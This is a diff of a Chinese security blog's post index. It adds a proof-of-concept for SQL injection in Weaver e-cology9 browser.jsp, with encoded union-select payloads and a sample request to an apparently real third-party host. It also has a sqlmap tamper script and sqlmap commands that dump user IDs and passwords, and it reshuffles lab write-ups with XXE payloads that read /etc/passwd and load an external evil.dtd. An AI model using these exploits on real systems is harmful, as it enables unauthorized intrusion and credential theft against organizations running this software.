-<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
-
-<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
-]]></content>
-      <categories>
-        <category>POC</category>
+        <category>pikachu靶场系列</category>
       </categories>
   </entry>
   <entry>
@@ -502,6 +484,42 @@
       </categories>
   </entry>
   <entry>
+    <title>泛微e-cology9 browser.jsp SQL注入</title>
+    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
+
+<p>sql语句经过了三层全字符的url编码</p>
+<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
+<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
+<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
+]]></content>
+      <categories>
+        <category>POC</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-RCE</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
     <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
@@ -551,24 +569,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/image-20230110101728753.png" alt="image-20230110101728753"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-敏感信息泄露</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
-    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
-<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
-<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
-<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
-<p>成功登录</p>
-<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
-<p>并且发现，该后台为未授权接口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
-
-<p>不需要登录也能访问</p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -635,66 +635,6 @@
 
 <p>查看页面源代码</p>
 <p><img src="/images/image-20230110163139174.png" alt="image-20230110163139174"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-XXE</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
-    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
-<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
-<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
-<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
-
-<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
-<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
-<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>
-
-<p>不止这些，不同的语言支持的协议不同</p>
-<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
-<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
-<p>XML实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>XML实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
-<p>比如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
-<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
-<p>则可能存在XXE漏洞</p>
-<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -777,6 +717,66 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class HACK</span><br><span class="line">&#123;</span><br><span class="line">    public $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo &quot;6666666666666&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$demo=new HACK();</span><br><span class="line">$demo-&gt;test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$a=serialize($demo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$pikachu=unserialize($a);</span><br><span class="line">echo $pikachu-&gt;test;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/image-20230110145751955.png" alt="image-20230110145751955"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-XXE</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
+    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
+<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
+<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
+<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+
+<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
+<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
+<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>
+
+<p>不止这些，不同的语言支持的协议不同</p>
+<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
+<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
+<p>XML实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
+<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
+<p>则可能存在XXE漏洞</p>
